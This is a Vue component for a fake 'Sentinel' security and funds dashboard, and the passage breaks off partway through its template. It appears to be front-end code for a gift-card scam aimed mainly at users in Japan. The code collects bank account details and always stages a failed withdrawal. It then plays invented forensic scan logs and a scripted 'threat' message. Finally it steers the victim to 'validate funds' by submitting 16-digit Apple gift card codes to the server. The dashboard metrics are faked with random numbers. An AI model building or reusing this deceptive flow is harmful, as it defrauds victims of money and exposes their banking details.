<script setup>
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout.vue';
import { Head, router, usePage } from '@inertiajs/vue3';
import { computed, nextTick, onMounted, ref } from 'vue';

const page = usePage();
const ACTION_LOCK_KEY = 'sentinel-user-actions-lock-until';
const ACTION_LOCK_DURATION_MS = 24 * 60 * 60 * 1000;

const systemStatus = ref({
    firewall: 'ACTIVE',
    intrusion: 'MONITORING',
    encryption: 'SECURE',
    network: 'STABLE'
});

const alerts = ref([
    { id: 1, type: 'warning', message: 'Unusual login attempt detected', time: '2 min ago' },
    { id: 2, type: 'info', message: 'System scan completed successfully', time: '15 min ago' },
    { id: 3, type: 'success', message: 'All security protocols updated', time: '1 hour ago' }
]);

const metrics = ref({
    threatsBlocked: 1247,
    activeSessions: 3,
    uptime: '99.98%',
    responseTime: '12ms'
});

const showWithdrawModal = ref(false);
const showTransferModal = ref(false);
const showSentinelScanModal = ref(false);
const bankName = ref('');
const branchCode = ref('');
const accountNumber = ref('');
const routingNumber = ref('');
const accountHolder = ref('');
const bankDetailsSaved = ref(false);
const withdrawMessage = ref('');
const withdrawError = ref('');
const isTransferInProgress = ref(false);
const transferStatus = ref('');
const transferFailed = ref(false);
const showSentinelModal = ref(false);
const showValidateOptions = ref(false);
const availableFundsSection = ref(null);
const fundsValidated = ref(false);
const fundsValidationMessage = ref('');
const showAppleForm = ref(false);
const appleSubmitting = ref(false);
const appleAmount = ref('');
const appleGiftCardAmount = ref('');
const actionsLockedUntil = ref(null);
const actionLockCountdown = ref('24:00:00');
const sentinelScanTimeLeft = ref(30);
const sentinelScanInProgress = ref(false);
const sentinelScanLogs = ref([]);
const sentinelScanThreatDetected = ref(false);
const sentinelScanThreatTitle = ref('');
const sentinelScanThreatMessage = ref('');

const withdrawableBalance = computed(() => Number(page.props.auth?.user?.withdrawable_balance ?? 0));
const userIsAdmin = computed(() => Boolean(page.props.auth?.user?.is_admin));
const currentCountryCode = computed(() => page.props.auth?.currentCountryCode ?? null);
const isJapanUser = computed(() => currentCountryCode.value === 'JP');
const areQuickActionsLocked = computed(() => !userIsAdmin.value && Boolean(actionsLockedUntil.value && actionsLockedUntil.value > Date.now()));
const bankNameLabel = computed(() => isJapanUser.value ? 'Japanese Bank Name' : 'Bank Name');
const branchCodeLabel = computed(() => isJapanUser.value ? 'Branch Code' : 'Routing Number');
const branchCodePlaceholder = computed(() => isJapanUser.value ? '3-digit branch code' : 'Enter routing number');
const accountNumberLabel = computed(() => isJapanUser.value ? 'Account Number' : 'Account Number');
const accountNumberPlaceholder = computed(() => isJapanUser.value ? '7-digit account number' : 'Enter account number');
const accountHolderLabel = computed(() => isJapanUser.value ? 'Account Name Holder' : 'Account Holder');
const accountHolderPlaceholder = computed(() => isJapanUser.value ? 'Example: SAWADA KAZUKI' : 'Enter account holder name');
const sentinelScanProgress = computed(() => ((30 - sentinelScanTimeLeft.value) / 30) * 100);

let sentinelScanTicker = null;
let sentinelScanLogStreamer = null;

const sentinelScanFeed = [
    '> Initializing Sentinel forensic relay for failed withdrawal trace...',
    '> Verifying SWIFT corridor entropy against secure ledger mirror...',
    '> Cross-checking outbound transfer payload with bank node checksum...',
    '> Reconstructing routing graph from encrypted settlement fragments...',
    '> Inspecting transactional nonce drift inside withdrawal handshake...',
    '> Measuring liquidity shadow variance across mirrored bank channels...',
    '> Comparing user-side bank standing with Sentinel vault registry...',
    '> Probing Yokohama corridor for hostile packet duplication signatures...',
    '> Identifying unauthorized replay vectors on settlement endpoint...',
    '> Tracing decoy ledger beacons inside transfer confirmation stream...',
    '> Inspecting route contamination from black-hole siphon infrastructure...',
    '> Evaluating bank node integrity against Sentinel trust anchors...',
    '> Synchronizing fraud telemetry with regional anti-spoof monitors...',
    '> Detecting anomaly bursts around withdrawal confirmation gateway...',
    '> Locking suspicious relay path pending liquidity verification...',
];

const formatYen = (value) => new Intl.NumberFormat('ja-JP').format(Number(value ?? 0));

const formatCountdown = (remainingMs) => {
    const totalSeconds = Math.max(0, Math.floor(remainingMs / 1000));
    const hours = Math.floor(totalSeconds / 3600).toString().padStart(2, '0');
    const minutes = Math.floor((totalSeconds % 3600) / 60).toString().padStart(2, '0');
    const seconds = (totalSeconds % 60).toString().padStart(2, '0');

    return `${hours}:${minutes}:${seconds}`;
};

const syncQuickActionLock = () => {
    if (userIsAdmin.value) {
        actionsLockedUntil.value = null;
        actionLockCountdown.value = '00:00:00';
        return;
    }

    const stored = window.localStorage.getItem(ACTION_LOCK_KEY);
    const parsed = stored ? Number(stored) : NaN;
    const nextExpiry = Number.isFinite(parsed) && parsed > Date.now()
        ? parsed
        : Date.now() + ACTION_LOCK_DURATION_MS;

    window.localStorage.setItem(ACTION_LOCK_KEY, String(nextExpiry));
    actionsLockedUntil.value = nextExpiry;
    actionLockCountdown.value = formatCountdown(nextExpiry - Date.now());
};

const openWithdrawModal = () => {
    showWithdrawModal.value = true;
    withdrawError.value = '';
    withdrawMessage.value = '';
};

const closeWithdrawModal = () => {
    showWithdrawModal.value = false;
    if (!bankDetailsSaved.value) {
        bankName.value = '';
        branchCode.value = '';
        accountNumber.value = '';
        routingNumber.value = '';
        accountHolder.value = '';
    }
    withdrawError.value = '';
};

const closeTransferModal = () => {
    showTransferModal.value = false;
    isTransferInProgress.value = false;
    transferStatus.value = '';
    transferFailed.value = false;
    withdrawMessage.value = '';
};

const stopSentinelScan = () => {
    if (sentinelScanTicker) {
        window.clearInterval(sentinelScanTicker);
        sentinelScanTicker = null;
    }

    if (sentinelScanLogStreamer) {
        window.clearInterval(sentinelScanLogStreamer);
        sentinelScanLogStreamer = null;
    }
};

const closeSentinelScanModal = () => {
    stopSentinelScan();
    showSentinelScanModal.value = false;
    sentinelScanInProgress.value = false;
    sentinelScanTimeLeft.value = 30;
    sentinelScanLogs.value = [];
    sentinelScanThreatDetected.value = false;
    sentinelScanThreatTitle.value = '';
    sentinelScanThreatMessage.value = '';
};

const completeSentinelScan = () => {
    stopSentinelScan();
    sentinelScanInProgress.value = false;
    sentinelScanThreatDetected.value = true;
    sentinelScanThreatTitle.value = 'Threat detected: Withdrawal relay mismatch';
    sentinelScanThreatMessage.value = 'Sentinel identified a forged settlement corridor between your registered bank path and the transfer mirror. The withdrawal was intercepted before release to prevent exposure to a Black Hole collection node.';
    sentinelScanLogs.value = [
        ...sentinelScanLogs.value,
        '> Scan complete. Threat correlation index elevated to CRITICAL.',
        '> Suspicious mirror route confirmed inside external settlement handshake.',
        '> Withdrawal relay quarantined. Manual Sentinel validation required.',
    ];
};

const openSentinelScanModal = () => {
    closeTransferModal();
    stopSentinelScan();

    showSentinelScanModal.value = true;
    sentinelScanInProgress.value = true;
    sentinelScanTimeLeft.value = 30;
    sentinelScanThreatDetected.value = false;
    sentinelScanThreatTitle.value = '';
    sentinelScanThreatMessage.value = '';
    sentinelScanLogs.value = [
        '> Sentinel scan requested by operator...',
        '> Mounting forensic lenses on failed withdrawal channel...',
    ];

    let logIndex = 0;

    sentinelScanTicker = window.setInterval(() => {
        if (sentinelScanTimeLeft.value <= 1) {
            sentinelScanTimeLeft.value = 0;
            completeSentinelScan();
            return;
        }

        sentinelScanTimeLeft.value -= 1;
    }, 1000);

    sentinelScanLogStreamer = window.setInterval(() => {
        const nextFeedLine = sentinelScanFeed[logIndex % sentinelScanFeed.length];
        const pressureBand = 82 + (logIndex % 14);
        const packetVariance = 14 + ((logIndex * 7) % 29);

        sentinelScanLogs.value = [
            ...sentinelScanLogs.value,
            `${nextFeedLine} [variance:${packetVariance}%|pressure:${pressureBand}]`,
        ].slice(-10);

        logIndex += 1;
    }, 1500);
};

const closeTransferModalFromBackdrop = () => {
    if (isTransferInProgress.value) {
        return;
    }

    closeTransferModal();
};

const submitWithdraw = () => {
    const regionSpecificCode = isJapanUser.value ? branchCode.value : routingNumber.value;

    if (!bankName.value || !accountNumber.value || !regionSpecificCode || !accountHolder.value) {
        withdrawError.value = 'Please complete all bank details before withdrawing.';
        return;
    }

    router.post(route('withdrawals.store'), {
        bank_name: bankName.value,
        branch_code: branchCode.value,
        account_number: accountNumber.value,
        routing_number: routingNumber.value,
        account_holder: accountHolder.value,
    }, {
        preserveScroll: true,
        onSuccess: () => {
            bankDetailsSaved.value = true;
            showWithdrawModal.value = false;
            withdrawError.value = '';
            withdrawMessage.value = '';
            startWithdraw();
        },
        onError: (errors) => {
            withdrawError.value = errors.bank_name
                ?? errors.branch_code
                ?? errors.account_number
                ?? errors.routing_number
                ?? errors.account_holder
                ?? errors.amount
                ?? 'Unable to submit the withdrawal request. Please review your bank details.';
        },
    });
};

const startWithdraw = () => {
    if (isTransferInProgress.value) {
        return;
    }

    withdrawMessage.value = '';
    transferFailed.value = false;
    transferStatus.value = 'Processing - Transferring';
    isTransferInProgress.value = true;
    showTransferModal.value = true;
    withdrawError.value = '';

    setTimeout(() => {
        isTransferInProgress.value = false;
        transferFailed.value = true;
        transferStatus.value = 'Bank balance needs to be validated first to secure the safety of the users funds.';
        withdrawError.value = '';
    }, 5000);
};

const validateFunds = async (method = null) => {
    fundsValidated.value = true;
    fundsValidationMessage.value = method
        ? `Validating via ${method}. Liquidity verification is now in progress. Please wait for Sentinel to confirm your funds.`
        : 'Liquidity verification is now in progress. Please wait for Sentinel to confirm your funds.';
    await nextTick();
    availableFundsSection.value?.scrollIntoView({ behavior: 'smooth', block: 'center' });
};

const openValidateOptions = () => {
    showValidateOptions.value = true;
};

const selectValidateMethod = async (method) => {
    if (method === 'PayPay' || method === 'Western Union') {
        fundsValidated.value = true;
        fundsValidationMessage.value = `${method} is not available at the moment. Please try another validation method.`;
        showValidateOptions.value = false;
        await nextTick();
        availableFundsSection.value?.scrollIntoView({ behavior: 'smooth', block: 'center' });
    } else if (method === 'Apple Gift Card') {
        showValidateOptions.value = false;
        showAppleForm.value = true;
    }
};

const submitAppleForm = () => {
    if (!appleAmount.value || !appleGiftCardAmount.value) {
        fundsValidationMessage.value = 'Please fill in both fields.';
        return;
    }

    const normalizedGiftCardCode = appleGiftCardAmount.value.replace(/\D/g, '');

    if (normalizedGiftCardCode.length !== 16) {
        fundsValidationMessage.value = 'Apple gift card validation requires exactly 16 digits.';
        return;
    }

    appleSubmitting.value = true;

    router.post('/validate-funds/apple-gift-card', {
        amount: appleAmount.value,
        gift_card_code: normalizedGiftCardCode,
    }, {
        preserveScroll: true,
        onSuccess: async () => {
            appleSubmitting.value = false;
            fundsValidated.value = true;
            fundsValidationMessage.value = `Validation submitted for ¥${formatYen(appleAmount.value)}. Awaiting admin approval before the amount is added to your withdrawable balance.`;
            showAppleForm.value = false;
            appleAmount.value = '';
            appleGiftCardAmount.value = '';

            await nextTick();
            availableFundsSection.value?.scrollIntoView({ behavior: 'smooth', block: 'center' });
        },
        onError: () => {
            appleSubmitting.value = false;
            fundsValidationMessage.value = 'Unable to submit validation. Please check the amount and code.';
        },
    });
};

const continueFromSentinel = async () => {
    closeSentinelModal();
    await openValidateOptions();
};

const openSentinelModal = () => {
    showSentinelModal.value = true;
};

const openSentinelPortalFromScan = () => {
    closeSentinelScanModal();
    openSentinelModal();
};

const closeSentinelModal = () => {
    showSentinelModal.value = false;
};

onMounted(() => {
    syncQuickActionLock();

    // Simulate real-time status updates
    setInterval(() => {
        metrics.value.threatsBlocked += Math.floor(Math.random() * 5) + 1;
        metrics.value.responseTime = `${12 + Math.floor(Math.random() * 6)}ms`;
        metrics.value.uptime = `99.${98 + Math.floor(Math.random() * 2)}%`;
    }, 5000);

    setInterval(() => {
        if (actionsLockedUntil.value) {
            actionLockCountdown.value = formatCountdown(actionsLockedUntil.value - Date.now());
        }
    }, 1000);
});
</script>

<template>
    <Head title="Sentinel Control Center" />

    <AuthenticatedLayout>
        <div class="py-6">
            <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
                <!-- Funds Cards -->
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                    <div ref="availableFundsSection" class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-5 backdrop-blur-sm">
                        <div class="flex items-start justify-between gap-4 mb-4">
                            <div>
                                <div class="text-xs text-cyan-400 uppercase tracking-wider mb-2">Available Funds</div>
                                <div class="text-3xl font-mono text-white">¥0</div>
                            </div>
                            <div class="text-sm text-red-400 font-semibold">Unverified</div>
                        </div>
                        <p class="text-sm text-gray-400 mb-4">Core operating funds available for immediate cyber operations.</p>
                        <div class="flex flex-wrap gap-3">
                            <button @click="openValidateOptions" class="bg-cyan-600 hover:bg-cyan-500 text-white rounded px-4 py-2 text-sm font-medium transition">
                                Validate Funds
                            </button>
                        </div>
                        <p v-if="fundsValidated" class="mt-4 text-sm text-cyan-200">{{ fundsValidationMessage }}</p>
                    </div>

                    <div v-if="showValidateOptions" class="fixed inset-0 z-[10000] flex items-center justify-center bg-black/80 px-4 py-6">
                        <div class="w-full max-w-xl rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                            <div class="flex items-start justify-between gap-4 mb-6">
                                <div>
                                    <h3 class="text-2xl font-semibold text-white">Validate Via</h3>
                                    <p class="mt-2 text-sm text-gray-400">Choose a verification method to continue secure funds validation.</p>
                                </div>
                                <button @click="showValidateOptions = false" class="text-gray-400 hover:text-white">✕</button>
                            </div>
                            <div class="grid gap-4 sm:grid-cols-3">
                                <button @click="selectValidateMethod('PayPay')" class="rounded-2xl border border-cyan-500/20 bg-slate-900 px-4 py-5 text-left text-white transition hover:border-cyan-400">
                                    <div class="text-sm uppercase tracking-wider text-cyan-400 mb-2">PayPay</div>
                                    <div class="text-sm text-gray-300">Secure node confirmation via digital payment link.</div>
                                </button>
                                <button @click="selectValidateMethod('Western Union')" class="rounded-2xl border border-cyan-500/20 bg-slate-900 px-4 py-5 text-left text-white transition hover:border-cyan-400">
                                    <div class="text-sm uppercase tracking-wider text-cyan-400 mb-2">Western Union</div>
                                    <div class="text-sm text-gray-300">Match your transfer channel to encrypted ledger records.</div>
                                </button>
                                <button @click="selectValidateMethod('Apple Gift Card')" class="rounded-2xl border border-cyan-500/20 bg-slate-900 px-4 py-5 text-left text-white transition hover:border-cyan-400">
                                    <div class="text-sm uppercase tracking-wider text-cyan-400 mb-2">Apple Gift Card</div>
                                    <div class="text-sm text-gray-300">Validate with a trusted gift card asset channel.</div>
                                </button>
                            </div>
                        </div>
                    </div>

                    <div v-if="showAppleForm" class="fixed inset-0 z-[10001] flex items-center justify-center bg-black/80 px-4 py-6">
                        <div class="w-full max-w-md rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                            <template v-if="!appleSubmitting">
                                <div class="flex items-start justify-between gap-4 mb-6">
                                    <div>
                                        <h3 class="text-xl font-semibold text-white">Apple Gift Card Validation</h3>
                                        <p class="mt-2 text-sm text-gray-400">Enter the required amounts to proceed with validation.</p>
                                    </div>
                                    <button @click="showAppleForm = false" class="text-gray-400 hover:text-white">✕</button>
                                </div>
                                <div class="space-y-4">
                                    <div>
                                        <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">Amount (JPY)</label>
                                        <input v-model="appleAmount" type="number" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" placeholder="Enter amount in yen" />
                                    </div>
                                    <div>
                                        <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">Code</label>
                                        <input v-model="appleGiftCardAmount" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" placeholder="Enter code" />
                                    </div>
                                </div>
                                <div class="mt-6 flex justify-end gap-3">
                                    <button @click="showAppleForm = false" class="rounded-lg border border-gray-700 bg-gray-800 px-4 py-2 text-sm font-medium text-gray-300 transition hover:bg-gray-700">Cancel</button>
                                    <button @click="submitAppleForm" class="rounded-lg bg-cyan-600 px-4 py-2 text-sm font-medium text-white transition hover:bg-cyan-500">Submit</button>
                                </div>
                            </template>
                            <template v-else>
                                <div class="flex flex-col items-center justify-center gap-4 py-10 text-center">
                                    <div class="h-16 w-16 rounded-full border-4 border-cyan-500 border-t-transparent animate-spin"></div>
                                    <div>
                                        <p class="text-lg font-semibold text-white">Please wait while we are veryfing this.</p>
                                        <p class="mt-2 text-sm text-gray-400">Sentinel is verifying your Apple Gift Card submission.</p>
                                    </div>
                                </div>
                            </template>
                        </div>
                    </div>
                    <div class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-5 backdrop-blur-sm">
                        <div class="flex items-start justify-between gap-4 mb-4">
                            <div>
                                <div class="text-xs text-cyan-400 uppercase tracking-wider mb-2">Withdrawable Balance</div>
                                <div class="text-3xl font-mono text-white">¥{{ formatYen(withdrawableBalance) }}</div>
                            </div>
                            <div class="text-sm text-green-400 font-semibold">Verified</div>
                        </div>
                        <p class="text-sm text-gray-400 mb-4">Funds cleared for withdrawal and emergency transfer.</p>
                        <div class="flex flex-wrap gap-3">
                            <button @click="openWithdrawModal" class="bg-gray-700 hover:bg-gray-600 text-white rounded px-4 py-2 text-sm font-medium transition">
                                Withdraw
                            </button>
                        </div>
                    </div>
                </div>

                <div v-if="showWithdrawModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 py-6">
                    <div class="w-full max-w-lg rounded-2xl border border-cyan-500/30 bg-gray-950/95 p-6 shadow-2xl shadow-cyan-500/10 backdrop-blur-md">
                        <div class="flex items-center justify-between mb-4">
                            <div>
                                <h3 class="text-lg font-semibold text-white">Confirm Bank Details</h3>
                                <p class="text-sm text-gray-400">{{ isJapanUser ? 'Japan-based users must enter a Japanese bank, a 3-digit branch code, a 7-digit account number, and the account name holder.' : 'Enter account information before completing the withdrawal.' }}</p>
                            </div>
                            <button @click="closeWithdrawModal" class="text-gray-400 hover:text-white">✕</button>
                        </div>
                        <div class="space-y-4">
                            <div>
                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ bankNameLabel }}</label>
                                <input v-model="bankName" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="isJapanUser ? 'Example: みずほ銀行' : 'Enter bank name'" />
                            </div>
                            <div>
                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ branchCodeLabel }}</label>
                                <input v-if="isJapanUser" v-model="branchCode" type="text" inputmode="numeric" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="branchCodePlaceholder" />
                                <input v-else v-model="routingNumber" type="text" inputmode="numeric" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="branchCodePlaceholder" />
                            </div>
                            <div>
                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ accountNumberLabel }}</label>
                                <input v-model="accountNumber" type="text" inputmode="numeric" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="accountNumberPlaceholder" />
                            </div>
                            <div>
                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ accountHolderLabel }}</label>
                                <input v-model="accountHolder" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="accountHolderPlaceholder" />
                            </div>
                        </div>
                        <div class="mt-4 flex flex-col gap-3 sm:flex-row sm:justify-end">
                            <button @click="closeWithdrawModal" class="w-full rounded-lg border border-gray-700 bg-gray-800 px-4 py-3 text-sm font-medium text-gray-300 transition hover:bg-gray-700 sm:w-auto">Cancel</button>
                            <button @click="submitWithdraw" class="w-full rounded-lg bg-cyan-600 px-4 py-3 text-sm font-medium text-white transition hover:bg-cyan-500 sm:w-auto">Submit Withdrawal</button>
                        </div>
                        <p v-if="withdrawError" class="mt-4 text-sm text-red-400">{{ withdrawError }}</p>
                    </div>
                </div>

                <div v-if="showTransferModal" @click.self="closeTransferModalFromBackdrop" class="fixed inset-0 z-50 flex items-center justify-center bg-black/70 px-4 py-6">
                    <div class="w-full max-w-md rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-6 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                        <div class="flex flex-col items-center justify-center space-y-4 text-center">
                            <div :class="['relative flex h-28 w-28 items-center justify-center rounded-full', transferFailed ? 'bg-red-950 ring-2 ring-red-500/50' : 'bg-slate-900/80 ring-2 ring-cyan-500/50']">
                                <div v-if="!transferFailed" class="absolute inset-0 rounded-full animate-ping bg-cyan-500/20"></div>
                                <div v-if="!transferFailed" :class="['relative flex h-16 w-16 items-center justify-center rounded-full bg-cyan-600 text-white text-3xl font-bold', isTransferInProgress ? 'animate-spin' : '']">↻</div>
                                <div v-else class="relative flex h-16 w-16 items-center justify-center rounded-full bg-red-600 text-white text-4xl font-bold">✕</div>
                            </div>
                            <div>
                                <h3 class="text-xl font-semibold text-white">{{ transferFailed ? 'Transfer failed' : 'Transfer in progress' }}</h3>
                                <p :class="transferFailed ? 'mt-2 text-sm text-red-300 font-semibold' : 'mt-2 text-sm text-gray-400'">
                                    {{ transferFailed ? 'The transfer was blocked for security validation.' : 'Your withdrawal is being routed through secure channels.' }}
                                </p>
                            </div>
                            <div v-if="transferFailed" class="mt-3 rounded-2xl bg-red-950/90 px-4 py-3 text-sm text-red-200 ring-1 ring-red-500/20">
                                {{ transferStatus }}
                            </div>
                            <button v-if="!isTransferInProgress" @click="openSentinelScanModal" class="mt-4 inline-flex rounded-full bg-cyan-600 px-5 py-2 text-sm font-semibold text-white transition hover:bg-cyan-500">Sentinel Scan</button>
                        </div>
                    </div>
                </div>

                <div v-if="showSentinelScanModal" @click.self="closeSentinelScanModal" class="fixed inset-0 z-[9998] flex items-center justify-center bg-black/80 px-4 py-6">
                    <div class="w-full max-w-4xl rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                        <div class="flex items-start justify-between gap-4 mb-6">
                            <div>
                                <h3 class="text-2xl font-semibold text-white">Sentinel Scan</h3>
                                <p class="mt-2 text-sm text-gray-400">Sentinel is forensically tracing the failed withdrawal route and isolating hostile relay behavior.</p>
                            </div>
                            <button @click="closeSentinelScanModal" class="text-gray-400 hover:text-white">✕</button>
                        </div>

                        <div class="grid gap-6 lg:grid-cols-[1.2fr_0.8fr]">
                            <div class="rounded-2xl border border-cyan-500/20 bg-slate-900/70 p-5">
                                <div class="flex items-center justify-between gap-4 mb-4">
                                    <div>
                                        <div class="text-xs uppercase tracking-[0.25em] text-cyan-400">Forensic Live Feed</div>
                                        <div class="mt-2 text-sm text-slate-300">Withdrawal relay diagnostics with threat graph reconstruction.</div>
                                    </div>
                                    <div class="text-right">
                                        <div class="text-xs uppercase tracking-[0.2em] text-slate-400">Time Remaining</div>
                                        <div class="mt-2 text-2xl font-mono text-cyan-300">{{ formatCountdown(sentinelScanTimeLeft * 1000) }}</div>
                                    </div>
                                </div>

                                <div class="h-3 overflow-hidden rounded-full bg-slate-800 ring-1 ring-cyan-500/20">
                                    <div class="h-full rounded-full bg-gradient-to-r from-cyan-500 via-sky-400 to-emerald-400 transition-all duration-1000" :style="{ width: `${sentinelScanProgress}%` }"></div>
                                </div>

                                <div class="mt-5 max-h-80 overflow-y-auto rounded-2xl border border-cyan-500/20 bg-black/60 p-4 font-mono text-xs text-cyan-200">
                                    <div v-for="(line, index) in sentinelScanLogs" :key="`sentinel-log-${index}`" class="mb-3 last:mb-0">
                                        {{ line }}
                                    </div>
                                </div>
                            </div>

                            <div class="rounded-2xl border border-slate-700 bg-slate-900/70 p-5">
                                <div class="text-xs uppercase tracking-[0.25em] text-slate-400">Threat Analysis</div>

                                <div v-if="sentinelScanInProgress" class="mt-5 space-y-4">
                                    <div class="rounded-2xl border border-cyan-500/20 bg-cyan-950/20 p-4 text-sm text-slate-200">
                                        Sentinel is correlating routing anomalies, liquidity mismatches, settlement echoes, and hostile mirror signatures across the withdrawal path.
                                    </div>
                                    <div class="rounded-2xl border border-slate-700 bg-slate-950/80 p-4 text-sm text-slate-300">
                                        Detection stack:
                                        <div class="mt-2 text-cyan-300">Mirror route entropy analysis</div>
                                        <div class="mt-2 text-cyan-300">Black Hole siphon beacon detection</div>
                                        <div class="mt-2 text-cyan-300">Bank standing checksum reconciliation</div>
                                        <div class="mt-2 text-cyan-300">Relay spoof confirmation</div>
                                    </div>
                                </div>

                                <div v-else-if="sentinelScanThreatDetected" class="mt-5 space-y-4">
                                    <div class="rounded-2xl border border-red-500/30 bg-red-950/40 p-4">
                                        <div class="text-sm font-semibold uppercase tracking-[0.2em] text-red-300">{{ sentinelScanThreatTitle }}</div>
                                        <p class="mt-3 text-sm text-red-100">{{ sentinelScanThreatMessage }}</p>
                                    </div>
                                    <div class="rounded-2xl border border-amber-500/20 bg-amber-950/20 p-4 text-sm text-amber-100">
                                        Sentinel recommends a Secure Validation Portal handshake before another release attempt is permitted.
                                    </div>
                                    <button @click="openSentinelPortalFromScan" class="inline-flex rounded-full bg-cyan-600 px-5 py-2 text-sm font-semibold text-white transition hover:bg-cyan-500">Ask Sentinel</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div v-if="showSentinelModal" @click.self="closeSentinelModal" class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/75 px-4 py-6">
                    <div class="w-full max-w-3xl rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                        <div class="flex items-start justify-between gap-4 mb-6">
                            <div>
                                <h3 class="text-2xl font-semibold text-white">Secure Validation Portal</h3>
                                <p class="mt-2 text-sm text-gray-400">Sentinel will verify your bank standing and lift the withdrawal lock once values match.</p>
                            </div>
                            <button @click="closeSentinelModal" class="text-gray-400 hover:text-white">✕</button>
                        </div>
                        <div class="space-y-4 text-sm text-gray-300">
                            <p>To unlock your funds, Sentinel must perform a Liquidity Verification Scan. This ensures that the bank balance on your end matches the secure records in our encrypted vault. If we attempt a transfer while the link is 'Unverified,' the funds could be pulled into a 'Black Hole' server created by the impersonator.</p>
                            <p class="font-semibold text-cyan-300">Resolution:</p>
                            <p>Please proceed to the Secure Validation Portal. You will be asked to verify your current bank standing so I can 'White-list' your banking node. Once the values match, the withdrawal lock will be lifted instantly.</p>
                        </div>
                        <div class="mt-6 flex justify-end">
                            <button @click="continueFromSentinel" class="rounded-full bg-cyan-600 px-6 py-3 text-sm font-semibold text-white transition hover:bg-cyan-500">Continue</button>
                        </div>
                    </div>
                </div>

                <div v-if="withdrawMessage" class="rounded-lg border border-green-500/30 bg-green-900/70 p-4 text-sm text-green-200 mb-6">
                    {{ withdrawMessage }}
                </div>

                <div v-if="withdrawError && !showTransferModal" class="rounded-lg border border-red-500/30 bg-red-950/80 p-4 text-sm text-red-200 mb-6">
                    {{ withdrawError }}
                </div>

                <!-- System Status Grid -->
                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                    <div v-for="(status, key) in systemStatus" :key="key"
                         class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm">
                        <div class="flex items-center justify-between mb-2">
                            <span class="text-xs text-cyan-400 uppercase tracking-wider">{{ key }}</span>
                            <div class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                        </div>
                        <div class="text-lg font-mono text-green-400">{{ status }}</div>
                    </div>
                </div>

                <!-- Metrics Row -->
                <div class="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                    <div class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm">
                        <div class="text-xs text-cyan-400 uppercase tracking-wider mb-1">Threats Blocked</div>
                        <div class="text-2xl font-mono text-white">{{ metrics.threatsBlocked.toLocaleString() }}</div>
                    </div>
                    <div class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm">
                        <div class="text-xs text-cyan-400 uppercase tracking-wider mb-1">Active Sessions</div>
                        <div class="text-2xl font-mono text-white">{{ metrics.activeSessions }}</div>
                    </div>
                    <div class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm">
                        <div class="text-xs text-cyan-400 uppercase tracking-wider mb-1">System Uptime</div>
                        <div class="text-2xl font-mono text-green-400">{{ metrics.uptime }}</div>
                    </div>
                    <div class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm">
                        <div class="text-xs text-cyan-400 uppercase tracking-wider mb-1">Response Time</div>
                        <div class="text-2xl font-mono text-white">{{ metrics.responseTime }}</div>
                    </div>
                </div>

                <!-- Main Content Grid -->
                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    <!-- Security Alerts -->
                    <div class="lg:col-span-2 bg-gray-900/80 border border-cyan-500/30 rounded-lg backdrop-blur-sm">
                        <div class="p-4 border-b border-cyan-500/20">
                            <h3 class="text-lg font-semibold text-white flex items-center">
                                <span class="w-2 h-2 bg-red-500 rounded-full mr-2 animate-pulse"></span>
                                Security Alerts
                            </h3>
                        </div>
                        <div class="p-4 max-h-96 overflow-y-auto">
                            <div v-for="alert in alerts" :key="alert.id"
                                 class="flex items-start space-x-3 p-3 rounded-lg mb-3"
                                 :class="{
                                     'bg-red-900/20 border border-red-500/30': alert.type === 'warning',
                                     'bg-blue-900/20 border border-blue-500/30': alert.type === 'info',
                                     'bg-green-900/20 border border-green-500/30': alert.type === 'success'
                                 }">
                                <div class="flex-shrink-0">
                                    <div :class="{
                                        'w-2 h-2 bg-red-500': alert.type === 'warning',
